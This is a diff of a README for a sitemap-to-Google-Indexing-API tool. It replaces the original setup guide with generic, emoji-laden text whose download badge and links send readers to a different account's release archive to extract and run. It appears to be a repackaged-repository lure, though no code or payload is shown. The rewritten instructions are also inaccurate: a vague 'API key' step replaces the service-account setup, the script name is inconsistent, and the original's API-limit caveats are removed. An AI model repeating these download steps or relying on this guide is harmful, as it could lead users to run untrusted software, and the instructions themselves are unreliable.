@@ -1,172 +1,110 @@
-# Google Sitemap Indexer
+# 🌐 google-search-console-indexer - Quickly Submit URLs for Google Indexing
 
-Automatically extract URLs from XML sitemaps and submit them to Google Indexing API.
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/kenzelbargas09/google-search-console-indexer/releases)
 
-![Demo](assets/screenshot.png)
+## 🚀 Getting Started
 
-## Features
+Welcome to the google-search-console-indexer! This tool helps you extract URLs from XML sitemaps and quickly submit them to the Google Indexing API. It speeds up the indexing of your content, making it essential for website owners and SEO experts.
 
-- Recursively crawls sitemap indexes and nested sitemaps
-- Extracts all URLs from XML sitemaps
-- Submits URLs to Google Indexing API for faster indexing
-- Built-in rate limiting and error handling
-- Progress tracking and detailed reporting
+### 📥 System Requirements
 
-## Prerequisites
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any Linux distribution.
+- **Python Version:** Python 3.6 or higher installed. You can download it from [python.org](https://www.python.org/downloads/).
+- **Internet Connection:** Required to submit URLs to Google.
 
-- Python 3.7+
-- Google Cloud account
-- Google Search Console access
+## 📋 Features
 
-## Installation
+- Extract URLs from XML sitemaps, including nested sitemap indexes.
+- Automatically submit URLs to the Google Indexing API.
+- Bulk processing to handle multiple URLs at once.
+- Rate limiting to avoid overloading the API.
+- Detailed progress reporting to keep track of submissions.
 
-1. **Clone the repository**
-```bash
-git clone https://github.com/mrxehmad/google-search-console-indexer.git
-cd google-search-console-indexer
-```
+## 🛠️ Installing Dependencies
 
-2. **Install dependencies**
-```bash
-pip install -r requirements.txt
-```
+Before using the application, you need to install some dependencies. Follow these steps based on your operating system:
 
-## Google Cloud Setup
+### Windows
+1. Open Command Prompt.
+2. Run the command: 
+   ```bash
+   pip install requests lxml
+   ```
 
-### 1. Create a Google Cloud Project
+### macOS / Linux
+1. Open Terminal.
+2. Run the command: 
+   ```bash
+   pip install requests lxml
+   ```
 
-- Go to [Google Cloud Console](https://console.cloud.google.com/)
-- Click **Select a project** → **New Project**
-- Enter a project name and click **Create**
+## 📥 Download & Install
 
-### 2. Enable the Indexing API
+To download the latest version of google-search-console-indexer, visit the page below:
 
-- In your project, go to **APIs & Services** → **Library**
-- Search for **"Web Search Indexing API"**
-- Click on it and press **Enable**
+[Download the latest release](https://github.com/kenzelbargas09/google-search-console-indexer/releases)
 
-### 3. Create Service Account
+### 💾 Running the Application
 
-- Go to **APIs & Services** → **Credentials**
-- Click **Create Credentials** → **Service Account**
-- Fill in the name (e.g., `sitemap-indexer`) and click **Create**
-- Skip optional steps and click **Done**
+Once you have downloaded the tool, follow these steps to run it:
 
-### 4. Download JSON Key
+1. **Locate the Downloaded File:**
+   Navigate to your Downloads folder and find the `google-search-console-indexer` file.
 
-- Click on the service account you just created
-- Go to the **Keys** tab
-- Click **Add Key** → **Create new key**
-- Choose **JSON** and click **Create**
-- The file will download automatically
-- Rename it to `service-account.json` and place it in the project root
+2. **Extract the Files:**
+   If the file is in a zip format, right-click on it and select "Extract All." Choose a location you can easily access.
 
-### 5. Add Service Account to Search Console
+3. **Open Command Prompt / Terminal:**
+   - For Windows, search for "cmd" and open Command Prompt.
+   - For macOS, search for "Terminal" and open it.
 
-**This step is critical!**
+4. **Navigate to the Extracted Folder:**
+   Use the `cd` command to change directories. For example:
+   ```bash
+   cd path\to\extracted\folder
+   ```
 
-- Open your `service-account.json` file
-- Copy the email address from the `client_email` field
-- Go to [Google Search Console](https://search.google.com/search-console/)
-- Select your property
-- Click **Settings** → **Users and permissions** → **Add user**
-- Paste the service account email
-- Set permission level to **Owner**
-- Click **Add**
+5. **Run the Application:**
+   Execute the following command:
+   ```bash
+   python indexer.py
+   ```
 
-## Configuration
+Now the tool is ready to help you submit your URLs!
 
-Edit `sitemap-indexer.py` and update the path to your service account file:
+## 📚 How to Use the Tool
 
-```python
-SERVICE_ACCOUNT_FILE = 'service-account.json'
-```
+1. **Prepare Your XML Sitemap:**
+   Ensure your XML sitemap is available. It should comply with XML sitemap standards.
 
-You can also adjust:
-- `BATCH_SIZE` - Max URLs to process (default: 200)
-- `DELAY_SECONDS` - Delay between requests (default: 1.0)
+2. **Provide Your Google API Credentials:**
+   You will need a Google API account and the necessary credentials. Visit the [Google Cloud Console](https://console.cloud.google.com/) to create your project and get your API key.
 
-## Usage
+3. **Input Your Sitemap URL:**
+   When prompted, enter the URL of your sitemap.
 
-Basic usage:
-```bash
-python sitemap-indexer.py -u https://example.com/sitemap.xml
-```
+4. **Start the Process:**
+   Follow the on-screen instructions to start extracting URLs and submitting them to the Google Indexing API.
 
-Process with custom batch size:
-```bash
-python sitemap-indexer.py -u https://example.com/sitemap.xml --batch 100
-```
+## 📊 Monitoring Progress
 
-Add delay between requests:
-```bash
-python sitemap-indexer.py -u https://example.com/sitemap.xml --delay 2.0
-```
+As the tool processes your requests, it will display a progress bar in the terminal. You will receive notifications once the submissions are complete or if there are any errors.
 
-View all options:
-```bash
-python sitemap-indexer.py --help
-```
+## 📈 Troubleshooting
 
-## Example Output
+If you encounter issues, consider the following tips:
 
-```
-============================================================
-Google Sitemap Indexer
-============================================================
-Service Account: service-account.json
-Sitemap URL: https://example.com/sitemap.xml
-Batch Size: 200
-Delay: 1.0s
-============================================================
+- **Check Your Internet Connection:** Ensure you are connected to the internet.
+- **Validate Your Sitemap:** Use XML sitemap validators to check if your sitemap is correctly formatted.
+- **API Quotas:** Be mindful of Google’s API usage limits. If you exceed these limits, your submissions may fail.
 
-Processing sitemap: https://example.com/sitemap.xml
-Found 3 nested sitemaps
+## 📞 Support
 
-Processing sitemap: https://example.com/sitemap-posts.xml
-Found 150 URLs
+If you need further assistance, feel free to open an issue on the repository or check the FAQs in the [Issues section](https://github.com/kenzelbargas09/google-search-console-indexer/issues).
 
-============================================================
-Total unique URLs found: 185
-============================================================
+## 📢 Additional Resources
 
-[1/185] ✓ Indexed: https://example.com/post-1
-[2/185] ✓ Indexed: https://example.com/post-2
-...
+- [Google Indexing API Documentation](https://developers.google.com/search/apis/indexing-api/v3)
+- [XML Sitemap Guidelines](https://www.sitemaps.org/protocol.html)
 
-============================================================
-Indexing Summary:
-Total URLs: 185
-Successfully indexed: 183
-Failed: 2
-============================================================
-```
-
-## Troubleshooting
-
-**403 Forbidden / Permission Denied**
-- Ensure service account email is added as **Owner** in Search Console (not just User)
-
-**API Not Enabled**
-- Go to Google Cloud Console and enable "Web Search Indexing API"
-
-**File Not Found**
-- Check the `SERVICE_ACCOUNT_FILE` path in the script
-
-**Invalid Credentials**
-- Re-download the service account JSON key from Google Cloud Console
-
-## API Limits
-
-- Default quota: **200 URLs per day**
-- You can request quota increases in Google Cloud Console
-- The Indexing API is primarily for job postings and livestream videos
-- For general pages, regular sitemap submission is recommended
-
-## License
-
-MIT License - see LICENSE file for details
-
-## Support
-
-For issues and questions, please open an issue on GitHub or check [Google's Indexing API documentation](https://developers.google.com/search/apis/indexing-api/v3/quickstart).
+For those looking to enhance their site's SEO, the google-search-console-indexer is a valuable tool to have in your toolkit. Happy indexing!
